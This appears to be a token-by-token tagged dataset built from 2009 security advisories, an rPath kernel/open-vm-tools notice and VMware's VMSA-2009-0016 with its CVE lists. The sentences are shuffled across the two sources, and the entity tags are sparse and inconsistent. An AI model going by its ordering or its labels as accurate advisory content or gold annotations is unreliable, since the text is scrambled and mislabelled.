Root O
Deterministic O
Unauthorized O
Access O
Updated O
Versions O
: O
kernel=conary.rpath.com O
@ O
rpl:2/2.6.29.6-0.6-1 O
kernel=rap.rpath.com O
@ O
rpath O
: O
linux-1/2.6.29.6-7-1 O
open-vm-tools=conary.rpath.com O
@ O
rpl:2/2009.07.22_179896-0.2-1 O
open-vm-tools=rap.rpath.com O
@ O
rpath O
: O
linux-1/2009.07.22_179896-2-1 O
rPath O
Issue O
Tracking O
System O
: O
References O
: O

In O
addition O
, O
the O
open-vm-tools O
package O
( O
including O
kernel O
modules O
) O
has O
been O
updated O
to O
the O
most O
recent O
upstream O
release O
for O
continued O
compatibility O
with O
new O
VMware O
hosts O
. O

Copyright O
2009 O
rPath O
, O
Inc O
. O

However O
, O
the O
library O
interfaces O
included O
in O
open-vm-tools O
are O
not O
being O
maintained O
by O
rPath O
as O
a O
stable O
library O
interface O
; O
future O
updates O
of O
the O
open-vm-tools O
package O
will O
follow O
whatever O
changes O
have O
been O
made O
in O
the O
upstream O
open-vm-tools O
package O
to O
the O
open-vm-tools O
libraries O
, O
even O
if O
those O
changes O
are O
incompatible O
with O
the O
current O
versions O
. O

rPath O
Linux O
is O
configured O
by O
default O
with O
vm.mmap_min_addr=65536 O
and O
so O
is O
not O
vulnerable O
by O
default O
. O

Description O
: O
Previous O
versions O
of O
the O
kernel O
have O
a O
weakness O
which O
in O
a O
non-default O
configuration O
( O
if O
vm.mmap_min_addr O
is O
0 O
) O
allows O
normal O
users O
processes O
to O
execute O
arbitrary O
code O
as O
the O
root O
user O
. O

In O
addition O
, O
this O
enables O
user O
programs O
to O
use O
the O
libraries O
included O
in O
open-vm-tools O
. O

rPSA-2009-0121-1 O
kernel O
open-vm-tools O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
- O
VMware O
Security O
Advisory O
Advisory O
ID O
: O
VMSA-2009-0016 O
Synopsis O
: O
VMware O
vCenter O
and O
ESX O
update O
release O
and O
vMA O
patch O
release O
address O
multiple O
security O
issue O
in O
third O
party O
components O
Issue O
date O
: O
2009-11-20 O
Updated O
on O
: O
2009-11-20 O
( O
initial O
release O
of O
advisory O
) O
CVE O
numbers O
: O
JRE O
CVE-2009-1093 O
CVE-2009-1094 O
CVE-2009-1095 O
CVE-2009-1096 O
CVE-2009-1097 O
CVE-2009-1098 O
CVE-2009-1099 O
CVE-2009-1100 O
CVE-2009-1101 O
CVE-2009-1102 O
CVE-2009-1103 O
CVE-2009-1104 O
CVE-2009-1105 O
CVE-2009-1106 O
CVE-2009-1107 O
CVE-2009-2625 O
CVE-2009-2670 O
CVE-2009-2671 O
CVE-2009-2672 O
CVE-2009-2673 O
CVE-2009-2675 O
CVE-2009-2676 O
CVE-2009-2716 O
CVE-2009-2718 O
CVE-2009-2719 O
CVE-2009-2720 O
CVE-2009-2721 O
CVE-2009-2722 O
CVE-2009-2723 O
CVE-2009-2724 O
Tomcat O
CVE-2008-5515 O
CVE-2009-0033 O
CVE-2009-0580 O
CVE-2009-0781 O
CVE-2009-0783 O
CVE-2008-1232 O
CVE-2008-1947 O
CVE-2008-2370 O
CVE-2007-5333 O
CVE-2007-5342 O
CVE-2007-5461 O
CVE-2007-6286 O
CVE-2008-0002 O
ntp O
CVE-2009-1252 O
CVE-2009-0159 O
kernel O
CVE-2008-3528 O
CVE-2008-5700 O
CVE-2009-0028 O
CVE-2009-0269 O
CVE-2009-0322 O
CVE-2009-0675 O
CVE-2009-0676 O
CVE-2009-0778 O
CVE-2008-4307 O
CVE-2009-0834 O
CVE-2009-1337 O
CVE-2009-0787 O
CVE-2009-1336 O
CVE-2009-1439 O
CVE-2009-1633 O
CVE-2009-1072 O
CVE-2009-1630 O
CVE-2009-1192 O
CVE-2007-5966 O
CVE-2009-1385 O
CVE-2009-1388 O
CVE-2009-1389 O
CVE-2009-1895 O
CVE-2009-2406 O
CVE-2009-2407 O
CVE-2009-2692 O
CVE-2009-2698 O
CVE-2009-0745 O
CVE-2009-0746 O
CVE-2009-0747 O
CVE-2009-0748 O
CVE-2009-2847 O
CVE-2009-2848 O
python O
CVE-2007-2052 O
CVE-2007-4965 O
CVE-2008-1721 O
CVE-2008-1887 O
CVE-2008-2315 O
CVE-2008-3142 O
CVE-2008-3143 O
CVE-2008-3144 O
CVE-2008-4864 O
CVE-2008-5031 O
bind O
CVE-2009-0696 O
libxml O
and O
libxml2 O
CVE-2009-2414 O
CVE-2009-2416 O
curl O
CVE-2009-2417 O
gnutil O
CVE-2007-2052 O
- O
1 O
. O

ntp O
is O
also O
updated O
for O
ESXi O
userworlds O
. O

References O
CVE O
numbers O
JRE O
Tomcat O
ntp O
kernel O
python O
bind O
libxml O
and O
libxml2 O
curl O
gnutil O
- O
6 O
. O

A O
malicious O
, O
remote O
server O
could O
send O
a O
specially-crafted O
reply O
to O
an O
ntpq O
request O
that O
could O
crash O
ntpq O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
privileges O
of O
the O
user O
running O
the O
ntpq O
command O
. O

c. O
Third O
party O
library O
update O
for O
ntp O
. O

ESXi SN
3.5 SV
and O
ESXi SN
4.0 SV
have O
a O
ntp O
client O
that O
is O
affected O
by O
the O
following O
security O
issue O
. O

A O
Document O
Type O
Definition O
( O
DTD O
) O
defines O
the O
legal O
syntax O
( O
and O
also O
which O
elements O
can O
be O
used O
) O
for O
certain O
types O
of O
files O
, O
such O
as O
XML O
files O
. O

The O
currently O
installed O
version O
of O
Tomcat O
depends O
on O
your O
patch O
deployment O
history O
. O

The O
NTP O
security O
issue O
identified O
by O
CVE-2009-0159 O
is O
not O
relevant O
for O
ESXi O
3.5 O
and O
ESXi O
4.0 O
. O

The O
service O
consoles O
of O
ESX O
2.5.5 O
, O
ESX O
3.0.3 O
and O
ESX O
3.5 O
are O
not O
affected O
by O
CVE-2009-1252 O
. O

A O
remote O
attacker O
could O
use O
this O
flaw O
to O
send O
a O
specially-crafted O
dynamic O
update O
packet O
that O
could O
cause O
named O
to O
exit O
with O
an O
assertion O
failure O
. O

The O
following O
table O
lists O
what O
action O
remediates O
the O
vulnerability O
in O
the O
Service O
Console O
( O
column O
4 O
) O
if O
a O
solution O
is O
available O
. O

Strings O
generated O
by O
this O
function O
were O
not O
properly O
NULL-terminated O
, O
which O
could O
possibly O
cause O
disclosure O
of O
data O
stored O
in O
the O
memory O
of O
a O
Python O
application O
using O
this O
function O
. O

Updates O
for O
the O
ESX O
Service O
Console O
and O
vMA O
include O
kernel O
, O
ntp O
, O
Python O
, O
bind O
libxml O
, O
libxml2 O
, O
curl O
and O
gnutil O
packages O
. O

Multiple O
buffer O
and O
integer O
overflow O
flaws O
were O
found O
in O
the O
Python O
Unicode O
string O
processing O
and O
in O
the O
Python O
Unicode O
and O
string O
object O
implementations O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-0696 O
to O
this O
issue O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-2692 O
, O
CVE-2009-2698 O
to O
the O
security O
issues O
fixed O
in O
kernel O
2.6.18-128.7.1 O
. O

An O
attacker O
could O
use O
these O
flaws O
to O
cause O
a O
denial O
of O
service O
. O

Multiple O
integer O
overflow O
flaws O
were O
found O
in O
the O
Python O
imageop O
module O
. O

Relevant O
releases O
vCenter O
Server O
4.0 O
before O
Update O
1 O
ESXi O
4.0 O
without O
patch O
ESXi400-200911201-UG O
ESX O
4.0 O
without O
patches O
ESX400-200911201-UG O
, O
ESX400-200911223-UG O
, O
ESX400-200911232-SG O
, O
ESX400-200911233-SG O
, O
ESX400-200911234-SG O
, O
ESX400-200911235-SG O
, O
ESX400-200911237-SG O
, O
ESX400-200911238-SG O
vMA O
4.0 O
before O
patch O
02 O
3 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
Project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2009-1252 O
to O
this O
issue O
. O

If O
a O
Python O
application O
used O
the O
imageop O
module O
to O
process O
untrusted O
images O
, O
it O
could O
cause O
the O
application O
to O
disclose O
sensitive O
information O
, O
crash O
or O
, O
potentially O
, O
execute O
arbitrary O
code O
with O
the O
Python O
interpreter O
privileges O
. O

BIND O
includes O
a O
DNS O
server O
( O
named O
) O
; O
a O
resolver O
library O
( O
routines O
for O
applications O
to O
use O
when O
interfacing O
with O
DNS O
) O
; O
and O
tools O
for O
verifying O
that O
the O
DNS O
server O
is O
operating O
correctly O
. O

